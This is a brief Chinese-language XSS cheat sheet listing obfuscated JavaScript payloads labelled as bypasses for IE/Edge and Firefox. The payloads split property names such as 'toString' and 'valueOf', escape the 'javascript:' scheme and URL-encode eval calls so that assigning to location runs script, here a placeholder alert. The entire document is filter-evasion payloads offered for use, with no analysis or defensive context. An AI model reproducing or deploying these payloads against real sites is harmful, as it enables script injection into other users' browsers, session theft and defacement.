***XSS跨站
****IE Edge绕过:
```text
x='g',y='f',{['toStrin'+x]:[].join,length:1,0:'java\script:alert\x28123\x29',['valueO'+y]:location}-'';
'',{['toString']:[].join,length:1,0:'java\script:alert\x28123\x29',['valueOf']:location}-'';
'',{toString:[].join,length:1,0:'javascript:alert(123)',valueOf:location}-'';
```

****Firefox,渗透兼容:
```text
s={['toString']:[].join,length:1,0:'java\script:alert(123)',['valueOf']:location};eval(s+'');
x=g',y='f',s={['toStrin'%2bx]:[].join,length:1,0:'java\script:alert\x281\x29',['valueO'%2by]:location}-'';eval(s+'')
x=g',y='f',s={['toStrin'%2bx]:[].join,length:1,0:'java\script:alert\x281\x29',['valueO'%2by]:location};eval%28s%2b''%29;
```

